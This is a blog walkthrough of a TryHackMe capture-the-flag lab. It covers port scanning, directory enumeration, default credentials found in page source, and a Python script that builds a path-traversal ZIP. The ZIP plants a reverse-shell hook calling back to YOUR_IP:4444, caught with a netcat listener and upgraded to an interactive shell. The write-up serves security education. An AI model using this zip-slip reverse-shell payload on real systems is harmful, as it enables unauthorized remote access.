# TryHackMe Room: "The Hollow Shell" Walkthrough

<p>IntroductionThe The Hollow Shell room on TryHackMe focuses on web application vulnerabilities, specifically dealing with insecure ZIP file handling and Path Traversal flaws that ultimately lead to Remote Code Execution (RCE) and system access. </p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fnhariphi2o7tl6sy6jr3.png"><img alt=" " height="320" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fnhariphi2o7tl6sy6jr3.png" width="800" /></a></p>

<h2>
  
  
  1. Reconnaissance &amp; Port ScanningWe started by scanning the target IP using Nmap to identify open ports and services: 
</h2>

<h2>
  
  
  Command: nmap -sV -sC  
</h2>

<p>Results: The scan revealed SSH on port 22 and an HTTP web service running on port 5000 hosted via Gunicorn, titled Byte Lotus — Room Service.  </p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fjlc5cm4b08xuf49hyxp4.png"><img alt=" " height="315" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fjlc5cm4b08xuf49hyxp4.png" width="799" /></a></p>

<h2>
  
  
  2. Directory EnumerationWe used Gobuster to discover hidden directories and web paths on the application:
</h2>

<h2>
  
  
  Command: gobuster dir -u http://:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
</h2>

<p>Results: The enumeration uncovered key functional paths: </p>

<p>/login (Main staff sign-in page) </p>

<p>/upload (File upload feature) </p>

<p>/dashboard (Service dashboard panel) </p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fp34nyoqfdq70hukk28yq.png"><img alt=" " height="243" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fp34nyoqfdq70hukk28yq.png" width="800" /></a></p>

<ol>
<li>Logging into the Dashboard</li>
</ol>

<h2>
  
  
  By reviewing the HTML source code of the login page, we found default starter credentials provided by IT for staff members:
</h2>

<h2>
  
  
   Username : concierge 
</h2>

<h2>
  
  
   Password : StayNoticed2024! 
</h2>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F8hloa8tx9n1yj1xq6oh1.png"><img alt=" " height="321" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F8hloa8tx9n1yj1xq6oh1.png" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxzmyteg31mwdzz98b60f.png"><img alt=" " height="319" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxzmyteg31mwdzz98b60f.png" width="799" /></a></p>

<p>Using these credentials, we successfully logged into the dashboard (/dashboard) and accessed the shell upload functionality.</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F0cew7joto7oba856090e.png"><img alt=" " height="321" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F0cew7joto7oba856090e.png" width="799" /></a></p>

<ol>
<li>Exploitation &amp; RCE (Path Traversal via ZIP Upload)</li>
</ol>

<h2>
  
  
  The upload feature accepts ZIP archives containing display assets. To exploit this, we used the nano text editor to create a Python script named app.py:  
</h2>

<h2>
  
  
  Command: nano app.py
</h2>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fwlwzff2wfktmz5t8sx8j.png"><img alt=" " height="107" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fwlwzff2wfktmz5t8sx8j.png" width="317" /></a></p>

<h2>
  
  
  The upload feature accepts ZIP archives containing display assets. Using a Python script, we crafted a malicious ZIP file leveraging a path traversal vulnerability to write a Python payload into an external hooks directory (../../hooks/callback.py), which executes a reverse shell:
</h2>

<p>import zipfile</p>

<p>payload_content = b"""import socket, os, pty<br />
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
s.connect(('YOUR_IP', 4444))<br />
os.dup2(s.fileno(), 0)<br />
os.dup2(s.fileno(), 1)<br />
os.dup2(s.fileno(), 2)<br />
pty.spawn('/bin/sh')<br />
"""</p>

<p>with zipfile.ZipFile('reverse.zip', 'w') as zf:<br />
    info = zipfile.ZipInfo('../../hooks/callback.py')<br />
    zf.writestr(info, payload_content)<br />
    zf.writestr('shell.json', '{"name": "rev-shell", "version": "1.0", "assets": []}')</p>

<h2>
  
  
  print("[+] ZIP generated with safe 2-level traversal!")
</h2>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fv8sg6q8o581ndphayq24.png"><img alt=" " height="335" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fv8sg6q8o581ndphayq24.png" width="800" /></a></p>

<h2>
  
  
  After saving the file in nano, we executed the script to generate the payload:  
</h2>

<h2>
  
  
  Command: python3 app.py
</h2>

<p>Output: [+] ZIP generated with safe 2-level traversal!</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fhsmwoug9yjd23cslc8jp.png"><img alt=" " height="137" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fhsmwoug9yjd23cslc8jp.png" width="498" /></a></p>

<p>We then verified the creation of the reverse.zip file using the <br />
ls command.  </p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Frjnli7uh15es2e94z1k1.png"><img alt=" " height="240" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Frjnli7uh15es2e94z1k1.png" width="588" /></a></p>

<p>Next, we prepared to catch the connection:</p>

<h2>
  
  
  Listener Setup: We started a Netcat listener on our attack machine using 
</h2>

<h2>
  
  
  nc -lvnp 4444 
</h2>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fbx2dj1ixx5xrjtg92pkj.png"><img alt=" " height="181" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fbx2dj1ixx5xrjtg92pkj.png" width="425" /></a></p>

<p>Execution: After uploading (reverse.zip) through the web dashboard, the theme worker processed the hooks, successfully triggering our reverse shell.  </p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F0u3lug9cernfh9ppfs5l.png"><img alt=" " height="351" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F0u3lug9cernfh9ppfs5l.png" width="799" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F2xyu14uk5bj31s9cgk7l.png"><img alt=" " height="350" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F2xyu14uk5bj31s9cgk7l.png" width="800" /></a></p>

<ol>
<li>Shell Upgrade &amp; Finding the Flag
Upon receiving the initial shell connection on our Netcat listener, we upgraded it to a fully interactive shell using Python:
</li>
</ol>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fux5n4zaj91l6x4g7rzz0.png"><img alt=" " height="144" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fux5n4zaj91l6x4g7rzz0.png" width="566" /></a></p>




<h2>
  
  
  Command: python3 -c 'import pty; pty.spawn("/bin/bash")'
</h2>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F6qd8fn7h1p3ddzkzyez2.png"><img alt=" " height="126" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F6qd8fn7h1p3ddzkzyez2.png" width="568" /></a></p>

<p>Finally, we navigated through the system to retrieve the flag:  </p>

<p>We moved to the home directory using cd /home and identified the roomservice user.  </p>

<p>Navigating into it (cd roomservice), we listed the contents with ls and located flag.txt.  </p>

<p>We read the flag using cat flag.txt to successfully complete the room.  </p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F7asb1kh7bn4twogd2xjq.png"><img alt=" " height="409" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F7asb1kh7bn4twogd2xjq.png" width="568" /></a></p>

<p>THM{.........................}</p>

[Read original article on DEV](https://dev.to/mohammadali_30/tryhackme-room-the-hollow-shell-walkthrough-1gkd)